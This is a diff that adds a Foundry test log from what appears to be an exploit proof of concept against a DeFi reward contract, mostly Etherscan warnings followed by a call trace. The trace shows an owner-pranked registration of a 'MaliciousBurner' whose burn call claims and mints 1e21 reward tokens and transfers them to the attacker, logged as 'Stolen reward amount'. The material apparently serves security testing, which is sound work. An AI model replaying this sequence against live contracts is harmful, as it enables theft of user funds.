@@ -1,0 +1,60 @@
+No files changed, compilation skipped
+2026-06-16T13:45:52.850729Z  WARN foundry_fork_db::cache: Failed to read cache file err=Os { code: 2, kind: NotFound, message: "No such file or directory" } path="/Users/carl/.foundry/cache/rpc/mainnet/25330468"
+
+Ran 1 test for test/Exploit.t.sol:ExploitTest
+[PASS] testExploit() (gas: 142924)
+Logs:
+  Initial reward balance: 0
+  Final reward balance: 1000000000000000000000
+  Stolen reward amount: 1000000000000000000000
+
+2026-06-16T13:45:58.016449Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T13:45:58.016993Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T13:45:58.017034Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T13:45:58.017071Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T13:45:58.017103Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T13:45:58.017135Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T13:45:58.019224Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x5615deb798bb3e4dfa0139dfa1b3d433cc23b72f)
+2026-06-16T13:45:59.359095Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0xf62849f9a0b5bf2913b396098f7c7019b51a820a)
+2026-06-16T13:45:59.565973Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x2e234dae75c793f67a35089c9d99245e1c58470b)
+2026-06-16T13:45:59.567796Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x000000000000000000636f6e736f6c652e6c6f67)
+2026-06-16T13:45:59.568216Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x000000000000000000636f6e736f6c652e6c6f67)
+2026-06-16T13:45:59.568431Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x000000000000000000636f6e736f6c652e6c6f67)
+2026-06-16T13:45:59.568566Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T13:45:59.568670Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+Traces:
+  [162824] Attacker::testExploit()
+    ├─ [0] VM::startPrank(Owner: [0xC2D0108307Ff76eBb0ea05B78567b5eAF5AC7830])
+    │   └─ ← [Return]
+    ├─ [26984] BurnerManager::setBurner(0x000000000000000000000000000000000000dEaD, MaliciousBurner: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a])
+    │   ├─ emit AddBurner(token: 0x000000000000000000000000000000000000dEaD, newBurner: MaliciousBurner: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], oldBurner: 0x0000000000000000000000000000000000000000)
+    │   └─ ← [Return] true
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ [432] BurnerManager::burners(0x000000000000000000000000000000000000dEaD) [staticcall]
+    │   └─ ← [Return] MaliciousBurner: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a]
+    ├─ [2824] RewardToken::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [101254] MaliciousBurner::burn(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000000000000000000000, 0, 0)
+    │   ├─ [70837] MockUniswapV2Pair::claimLightReward()
+    │   │   ├─ [45330] RewardToken::mint(MaliciousBurner: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 1000000000000000000000 [1e21])
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Return] 1000000000000000000000 [1e21]
+    │   ├─ [701] MockUniswapV2Pair::rewardToken() [staticcall]
+    │   │   └─ ← [Return] RewardToken: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
+    │   ├─ [21994] RewardToken::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000000 [1e21])
+    │   │   └─ ← [Return] true
+    │   └─ ← [Stop]
+    ├─ [824] RewardToken::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 1000000000000000000000 [1e21]
+    ├─ [0] console::log("Initial reward balance:", 0) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Final reward balance:", 1000000000000000000000 [1e21]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Stolen reward amount:", 1000000000000000000000 [1e21]) [staticcall]
+    │   └─ ← [Stop]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.16s (1.32s CPU time)
+
+Ran 1 test suite in 7.90s (5.16s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
